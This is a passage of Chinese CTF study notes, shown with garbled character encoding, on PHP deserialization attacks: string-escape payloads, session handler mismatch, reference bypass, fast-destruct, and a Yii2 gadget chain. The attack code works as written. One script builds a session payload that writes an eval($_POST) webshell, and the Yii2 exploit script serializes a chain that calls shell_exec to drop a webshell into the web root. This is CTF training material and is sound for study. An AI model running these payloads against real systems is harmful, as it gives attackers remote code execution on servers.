- ä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼š

```php
//15 fuckfuckfucks:1
//15 loveuloveuloveus:1 
è¿™æ ·åœ¨å‰é¢é—­åˆå¥½ä¹‹åï¼Œså°±æˆåŠŸè¢«èµ‹å€¼ä¸ºäº†1
```

#### payoload

```php
   $msg1 = new message('fuck/*å¤šå°‘ä¸ªfuckå–å†³äºåé¢å­—ç¬¦ä¸²çš„é•¿åº¦*/";s:3:"msg";s:1:"b";s:2:"to";s:1:"c";s:5:"token";s:5:"admin";}','b','c');
```

### Sessionåºåˆ—åŒ–é€‰æ‹©å™¨æ¼æ´

#### 0x01 çŸ¥è¯†ç‚¹



**session_startï¼š**

https://www.php.net/manual/zh/function.session-start.php

å½“ä¼šè¯è‡ªåŠ¨å¼€å§‹æˆ–è€…é€šè¿‡ **session_start()** æ‰‹åŠ¨å¼€å§‹çš„æ—¶å€™ï¼Œ PHP å†…éƒ¨ä¼šè°ƒç”¨ä¼šè¯ç®¡ç†å™¨çš„ open å’Œ read å›è°ƒå‡½æ•°ã€‚ ä¼šè¯ç®¡ç†å™¨å¯èƒ½æ˜¯ PHP é»˜è®¤çš„ï¼Œ ä¹Ÿå¯èƒ½æ˜¯æ‰©å±•æä¾›çš„ï¼ˆSQLite æˆ–è€… Memcached æ‰©å±•ï¼‰ï¼Œ ä¹Ÿå¯èƒ½æ˜¯é€šè¿‡ [session_set_save_handler()](https://www.php.net/manual/zh/function.session-set-save-handler.php) è®¾å®šçš„ç”¨æˆ·è‡ªå®šä¹‰ä¼šè¯ç®¡ç†å™¨ã€‚ é€šè¿‡ read å›è°ƒå‡½æ•°è¿”å›çš„ç°æœ‰ä¼šè¯æ•°æ®ï¼ˆä½¿ç”¨ç‰¹æ®Šçš„åºåˆ—åŒ–æ ¼å¼å­˜å‚¨ï¼‰ï¼Œ **PHP ä¼šè‡ªåŠ¨ååºåˆ—åŒ–æ•°æ®å¹¶ä¸”å¡«å…… $_SESSION è¶…çº§å…¨å±€å˜é‡**



**session.serialize_handlerï¼š**

åœ¨php 5.5.4ä»¥å‰é»˜è®¤é€‰æ‹©çš„æ˜¯phpï¼Œ5.5.4ä¹‹åå°±æ˜¯php_serialize



æµ‹è¯•ä¸åŒå¤„ç†å™¨çš„ç»“æœï¼š

```php
<?php
session_start();
//ini_set('session.serialize_handler', 'php_serialize');
class User{
    public $username = 'a';
    public $password = 'b';

}
$a = new User;
$_SESSION['user'] = $a;
?>
```

![img](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669865970532-ecabf1f5-08b7-4ebc-beef-4f0d2815b481.png)

![img](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669866028318-648ce215-7ac5-4377-9232-d2435fb5b053.png)

- è¿™é‡Œçš„å€¼å’Œä¸´æ—¶æ–‡ä»¶åç§°ç›¸åŒ



**é»˜è®¤å€¼ä¸ºphpçš„ç»“æœï¼š**

![img](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669866286583-3ebe2ba6-56cd-4c8d-858f-007349c9ae46.png)

**å€¼ä¸ºphp_serializeçš„ç»“æœ**

![img](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669866513480-4c0e2851-9cac-48b0-9d4a-dfc5304b1249.png)

å½“è¯»sessionå’Œå†™sessionä½¿ç”¨ä¸åŒçš„å¤„ç†å™¨æ—¶ï¼Œå°±ä¼šå‡ºç°é—®é¢˜ã€‚

å¦‚æœå†™sessionç”¨çš„æ˜¯**php_serializeï¼Œä¸”****ç²¾å¿ƒæ„é€ äº†ä¸€ä¸ª |** 

```
a:1:{s:4:"user";O:4:"User":2:{s:8:"username|";s:1:"a";s:8:"password";s:1:"b";}}
```

è¯»çš„æ—¶å€™ï¼Œåœ¨å¼€å¯äº†session_startï¼Œå¯¹Phpæ•°æ®è¿›è¡Œååºåˆ—åŒ–ï¼Œå°±**ä¼šå¯¹ | åçš„æ•°æ®è¿›è¡Œååºåˆ—åŒ–**ã€‚



#### ä¾‹é¢˜

- åœ¨index.phpä¸­ï¼Œå¯ä»¥çœ‹åˆ°1å¤„å†™é”™äº†ï¼Œå› æ­¤å¯ä»¥æ„é€ `$_SESSION['limit']`çš„å€¼

![img](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669865526369-f84bd4e4-64b2-4230-9ddd-02775745d6cc.png)

- åœ¨check.phpä¸­åŒ…å«äº†inc.php

![img](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669866913446-5baf2efd-d0f8-433f-ac02-6e5175b2908a.png)

- åœ¨inc.phpä¸­ï¼Œç”¨phpå¤„ç†å™¨è¯»ï¼Œå’Œå‰é¢ä¸ä¸€æ ·ï¼Œå¼€å¯äº†session_start()ï¼Œä¼šååºåˆ—åŒ–æ•°æ®

![img](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669866819050-789983ac-4da0-40c7-bbfb-b1f05052d9e7.png)

- ä¸”è¿™é‡Œå¯ä»¥æ„é€ Userï¼Œç”¨file_put_contentså»ä¸Šä¼ ğŸ

![img](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669866836718-930b9f6d-ddd5-462e-a883-47a43f235c4a.png)



**ç»¼ä¸Šæ‰€è¿°ï¼šæˆ‘åœ¨index.phpä¸­æ„é€ ä¸€ä¸ªå¸¦ |  çš„åºåˆ—åŒ–æ•°æ®ï¼Œç”¨Cooikeä¼ ç»™sessionï¼Œåœ¨è®¿é—®check.phpé¡µé¢æ—¶ï¼Œç”±äºå®ƒåŒ…å«äº†inc.phpï¼Œinc.phpä¸­ç”¨phpå¤„ç†å™¨è¯»å–æ•°æ®ï¼Œå¹¶session_start()ååºåˆ—åŒ–æ•°æ®ï¼Œå°†index.phpä¸­æ„é€ çš„æ•°æ®æ³¨å…¥åˆ°file_put_contentså‡½æ•°ä¸­ã€‚**

```php
<?php
class User{
    public $username;
    public $password;
    public $status;

}
$a = new User("1.php",'<?php eval($_POST[1]);phpinfo();?>');
echo base64_encode("|".serialize($a));
?>
```

- è¿™é‡Œä¸Šä¼ é©¬ç”±äºæ²¡æœ‰å›æ˜¾ï¼Œä¸çŸ¥é“æ˜¯å¦æˆåŠŸï¼Œå› æ­¤åŠ ä¸€ä¸ªPhpinfoã€‚

### å¼•ç”¨ä¼ å€¼ç»•è¿‡==

ctmd

- æˆ‘æƒ³åˆ°èµ‹å€¼ï¼Œä½†æ˜¯æ²¡æƒ³åˆ°å¼•ç”¨

#### å¼•ç”¨èµ‹å€¼çš„åºåˆ—åŒ–

```php
<?php
class ctfshowAdmin{
    public $token;
    public $password;

    public function __construct($t,$p){
        $this->token=$t;
        $this->password = &$this->token;
    }
    public function login(){
        return $this->token===$this->password;
    }
}
$a = new ctfshowAdmin('123','123');
echo serialize($a);
?>
```

å¯ä»¥çœ‹åˆ°ï¼Œpasswordçš„ç±»å‹ä¸ºResourceï¼Œèµ„æºç±»å‹

**PHP èµ„æº resource æ˜¯ä¸€ç§ç‰¹æ®Šå˜é‡ï¼Œä¿å­˜äº†åˆ°å¤–éƒ¨èµ„æºçš„ä¸€ä¸ªå¼•ç”¨**

![img](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669880741234-5e053646-fde5-47e2-a1d3-fc9f67989418.png)



#### ä¾‹é¢˜

![img](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669881124045-cf051e9a-577a-4855-930a-509887de4f28.png)

- è¿™é‡Œä¼ `O:12:"ctfshowAdmin":2:{s:5:"token";s:3:"123";s:8:"password";R:2;}`



### å¿«é€Ÿé”€æ¯åŠå¤§å†™ç»•è¿‡

#### 0x01

**çŸ¥è¯†ç‚¹1ï¼š**

**è¿™é‡Œæµ‹è¯•å³ä½¿åŠ äº†'@'ä¹Ÿä¼šæŠ¥é”™ä¸æˆåŠŸï¼Œä¸çŸ¥é“ä¸ºå•¥**

åŸç†:å½“phpæ¥æ”¶åˆ°ç•¸å½¢åºåˆ—åŒ–å­—ç¬¦ä¸²æ—¶ï¼ŒPHPç”±äºå…¶å®¹é”™æœºåˆ¶ï¼Œä¾ç„¶å¯ä»¥ååºåˆ—åŒ–æˆåŠŸã€‚ä½†æ˜¯ï¼Œç”±äºæ˜¯ä¸€ä¸ªç•¸å½¢çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆä¼šç«‹åˆ»è§¦å‘é”€æ¯æ–¹æ³•ã€‚



çŸ¥è¯†ç‚¹2ï¼š

å¯¹äº`class ctfshow{}`è¿™ä¸ªç±»ï¼Œååºåˆ—åŒ–æ—¶ï¼Œå¯ä»¥å°†ç±»åä¸­çš„æŸå‡ ä¸ªå­—æ¯å¤§å†™ï¼Œä¹Ÿå¯ä»¥æ­£å¸¸ååºåˆ—åŒ–ã€‚

```php
$b = 'O:7:"CTfshoW":2:{s:8:"username";s:1:"1";s:8:"password";s:1:"2";}';
var_dump(unserialize($b));
//å¯ä»¥æ­£å¸¸è¾“å‡º
```

#### ä¾‹é¢˜

![img](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669885653998-703cfccf-4a78-4ffc-b4ad-f496489b8f1a.png)

- ä¼ å…¥ä¸€ä¸ªä¸å®Œæ•´çš„åºåˆ—åŒ–å­—ç¬¦ä¸²

### Yii2 ååºåˆ—åŒ–æ¼æ´

#### 0x01 æ¼æ´ä»‹ç»

https://www.cnblogs.com/thresh/p/13743081.html

- åœ¨æºç **BatchQueryResult.php**ä¸­ï¼Œ1å¤„ä¼šè°ƒç”¨2å¤„çš„æ–¹æ³•ï¼Œthis->dataReaderæ˜¯å®ƒçš„å±æ€§ï¼Œå¯ä»¥æ„é€ ï¼Œå› æ­¤æ‰¾ä¸€ä¸ªdataReaderä¸å­˜åœ¨close()ï¼Œä¸”å­˜åœ¨__callé­”æœ¯æ–¹æ³•ã€‚

![img](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669954019781-99cd36c0-f1a0-461e-b26f-d6319c83c462.png)

- åœ¨Generator.phpä¸­ï¼Œ__callä¼šè°ƒç”¨formatçš„å‡½æ•°ï¼Œæ­¤æ—¶è¿™é‡Œçš„`$method='close',$attributesä¸ºç©º`

![img](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669954157922-21513ee5-2acf-49de-adca-45b88cda3606.png)

- åœ¨formatå‡½æ•°ä¸­ï¼Œ`$formatter = 'close'`ï¼Œè°ƒç”¨getFormatteræ–¹æ³•ï¼Œç”±äº`this->formatters`æ˜¯å¯æ§çš„ï¼Œé‚£ä¹ˆgetFormatterçš„è¿”å›å€¼å°±å¯æ§ã€‚

![img](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669954260104-6dbe5ef9-4cb0-4369-a2ff-b049fe8d018a.png)

- $argumentsæ˜¯ä¸€ä¸ªç©ºçš„æ•°ç»„ï¼Œåœ¨call_user_func_arrayä¸­ï¼Œä¸‹é¢çš„ä»£ç æ˜¯å¯ä»¥æ­£å¸¸æ‰§è¡Œçš„ã€‚å› æ­¤è¿™é‡Œå°±å¯ä»¥ä»»æ„æ‰§è¡Œä¸€ä¸ªæ— å‚çš„å‡½æ•°ã€‚

```php
class A{
	public $a = 1;
  function bar(){
    echo $a;
}
call_user_func_array([new A,'bar'],array())
```

- åœ¨æ‰€æœ‰ä»£ç ä¸­æœç´¢call_user_funcå‡½æ•°ï¼Œåœ¨CreateActionä¸­ï¼Œ`this->checkAccess`æ˜¯å®ƒçš„å±æ€§ï¼Œ`thi->id`æ˜¯çˆ¶ç±»çš„å±æ€§ï¼Œå› æ­¤å¯ä»¥æ„é€ å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚

![img](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669954696096-141cef0f-9c3c-4b24-804d-6450d93a87e7.png)

#### 0x02 exp

- éœ€è¦æœ‰ä¸€ä¸ªååºåˆ—åŒ–çš„å…¥å£

```php
<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'shell_exec';
            $this->id = 'echo "<?php echo 3333333;eval($_POST[1]);?>" > /var/www/html/basic/web/3.php';

        }
    }   
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;
        public function __construct(){
            $this->formatters['close'] = [new CreateAction(), 'run'];
        }
    }
}

namespace yii\db{
    use Faker\Generator;

    class BatchQueryResult{
        private $_dataReader;

        public function __construct(){
            $this->_dataReader = new Generator;
        }
    }
}
namespace {
    echo base64_encode(serialize(new yii\db\BatchQueryResult));
} 
?>
```

#### 0x03 ä¾‹é¢˜ï¼ˆweb267ï¼‰

- é¡µé¢å°è¯•ç”¨admin adminæˆåŠŸç™»å½•
- æŸ¥çœ‹æºç å‘ç°view-sourceï¼Œè¿™é‡Œæ”¹æˆ`r=site%2Fabout&view-source`

![img](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669954912864-13372d34-72ef-4a84-9311-d85f6c3aff6c.png)

- å‘ç°ååºåˆ—åŒ–å…¥å£ï¼Œè®¿é—®`r=backdoor/shell`ï¼Œä¼ å…¥codeï¼Œcodeæ˜¯ä¸Šé¢expçš„ç»“æœ

![img](https://cdn.nlark.com/yuque/0/2022/png/29405061/1669954992458-02f1a329-2d4e-444a-8215-8dc13a65dc95.png)

#### 

# 

# 

# 
